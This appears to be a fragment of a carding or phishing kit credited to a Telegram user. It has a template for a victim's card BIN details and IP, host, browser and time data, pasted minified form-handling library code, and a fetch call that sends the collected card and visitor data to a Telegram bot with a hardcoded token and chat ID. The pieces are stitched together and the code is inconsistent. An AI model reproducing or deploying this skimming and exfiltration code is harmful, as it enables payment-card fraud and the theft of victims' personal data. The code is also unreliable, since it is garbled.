
########## BIN INFORMATION ##########

 BIN : ${binInf?.bin || 'N/A'}
 Bank : ${binInf?.bank || 'Unknown'}
 Brand : ${binInf?.brand || 'Unknown'}
 Type : ${binInf?.type || 'Unknown'}
 Country : ${binInf?.country || 'Unknown'}

######### IP INFO ##########

 IP : https://whatismyip.com/ip/${ip}
 Host : ${host}${path}
 Browser : ${browser}
 Time : ${time}


# Created by gnHack10 on Telegram !

function H(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var n=t.getValue(),r="";return
e&&(r=B(e)?e.checked?"true":"false":e.value),(e=r)!==n&&(t.setValue(e),!0)}function q(e){if(void
0===(e=e||("undefined"!=typeof document?document:void 0)))return null;try{return e.activeElement||e.body}catch(t){return
e.body}}function Z(e,t){var n=t.checked;return R({},t,{defaultChecked:void 0,defaultValue:void 0,value:void
0,checked:null!=n?n:e._wrapperState.initialChecked})}function $(e,t){var
n=null==t.defaultValue?"":t.defaultValue,r=null!=t.checked?t.checked:t.defaultChecked;n=V(null!=t.value?t.value:n),e._wrapperState={initialChecked:r,initialValue:n,controlled:"checkbox"===t.type||"radio"===t.type?null!=t.checked:null!=t.value}}function
K(e,t){null!=(t=t.checked)&&b(e,"checked",t,!1)}function X(e,t){K(e,t);var
n=V(t.value),r=t.type;if(null!=n)"number"===r?(0===n&&""===e.value||e.value!=n)&&(e.value=""+n):e.value!==""+n&&(e.value=""+n);else
if("submit"===r||"reset"===r)return void
e.removeAttribute("value");t.hasOwnProperty("value")?ee(e,t.type,n):t.hasOwnProperty("defaultValue")&&ee(e,t.type,V(t.defaultValue)),null==t.checked&&null!=t.defaultChecked&&(e.defaultChecked=!!t.defaultChecked)}function
J(e,t,n){if(t.hasOwnProperty("value")||t.hasOwnProperty("defaultValue")){var r=t.type;if(!("submit"!==r&&"reset"!==r||v

# Send data to Endpoint 
BotId = "4682738248:qdsbjiazkONSCazpdqsizKEedEcdv"
ChatId = "231736152"

fetch(`https://api.telegram.org/bot${BotId}/sendMessage`, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    chat_id: ChatId,
    text: `BIN Information:\n${binInfo}\n\nIP Information:\nIP: ${ip}\nHost: ${host}${path}\nBrowser: ${browser}\nTime: ${time}`
  })
})



